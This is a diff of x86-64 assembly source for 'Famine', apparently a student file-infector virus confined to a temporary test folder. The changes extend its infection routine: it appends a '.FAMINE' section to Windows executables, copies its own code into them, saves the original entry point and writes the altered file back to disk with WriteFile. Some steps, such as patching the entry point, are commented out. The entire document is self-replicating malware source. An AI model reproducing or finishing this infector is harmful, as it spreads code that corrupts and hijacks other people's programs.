@@ -21,15 +21,17 @@ extrn CreateFileA:proc
 extrn memcpy:proc
 extrn malloc:proc
 extrn GetFileSize:proc
+extrn SetFilePointer:proc
+extrn WriteFile:proc
 
 .code
 label_debut:
-MUST_EXIT db 0
+MUST_EXIT db 1
+ENTRY_POINT byte 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
 db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
 TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
 TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 SECTION_NAME db '.FAMINE',0
-ENTRY_POINT db 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
 
 ; rbp
 ; 56 - 64	: padding
@@ -42,7 +44,7 @@ ENTRY_POINT db 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
 ; r12 : handle
 ; r13 : fileSize
 ; r14 : taille de notre code
-; 
+; r15 : Optianl Header address
 
 handle_file proc ; int handle
 	push rbp
@@ -91,17 +93,18 @@ handle_file proc ; int handle
 	add rax, 3Ch
 	xor rdx, rdx
 	mov edx, dword ptr [rax] ; on saute le MS DOS header 
-	mov r12, rdx
 
 	mov rax, qword ptr [rsp + 40]
-	add rax, r12
+	add rax, rdx
 	add rax, 6
 	mov cx, word ptr [rax] ; cx = OldNumberOfSections
-	inc word ptr [rax] ; NumberOfSections++
+	;inc word ptr [rax] ; NumberOfSections++
 	add rax, 14
 
 	xor rbx, rbx
 	mov bx, word ptr [rax]
+		mov r15, rax
+		add r15, 4
 	add rax, rbx
 	add rax, 4 ;  ptr += SizeOfOptionaHeaders + 4
 
@@ -113,7 +116,7 @@ handle_file proc ; int handle
 
 	mov rax, 40
 	imul rdx
-	add rax, rbx
+	add rax, rbx ; rax += olDSizeOfOptionalHeaders
 
 	mov rbx, qword ptr [SECTION_NAME]
 	mov  [rax], rbx ; on met le nom de la section
@@ -130,6 +133,12 @@ handle_file proc ; int handle
 	or r8d, 0fffh
 	inc r8d
 	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle
+
+	add rax, 4
+	mov rbx, r14
+;	or rbx, 0ffh
+;	inc rbx
+	mov dword ptr [rax], ebx
 
 	add rax, 4
 	add r13, 2
@@ -150,7 +159,37 @@ handle_file proc ; int handle
 	lea rdx, label_debut
 	mov r8, r14
 	call memcpy
-	
+
+
+	mov rcx, [rsp + 40]
+	add rcx, r13
+	mov byte ptr [rcx], 0
+
+	add r15, 16
+	xor rbx, rbx
+	mov ebx, dword ptr [r15]
+	inc rcx
+	mov qword ptr [rcx], rbx
+
+	mov rax, label_main
+	mov rbx, label_debut
+	sub rax, rbx
+	add rax, r13
+;	mov dword ptr [r15], eax
+
+	mov rcx, r12
+	mov rdx, 0
+	mov r8, 0
+	mov r9, 0
+	call SetFilePointer
+
+	mov rcx, r12
+	mov rdx, [rsp + 40]
+	mov r8, r13
+	add r8, r14
+	lea r9, [rsp + 56]
+	mov qword ptr [rsp + 32], 0
+	call WriteFile
 
 ret_failure:
 	mov rsp, rbp
@@ -282,6 +321,8 @@ infect_folder endp
 ; 32-40 : av[0]
 ; 00-32 : shadow space
 ; rsp 
+
+label_main:
 
 main proc
 
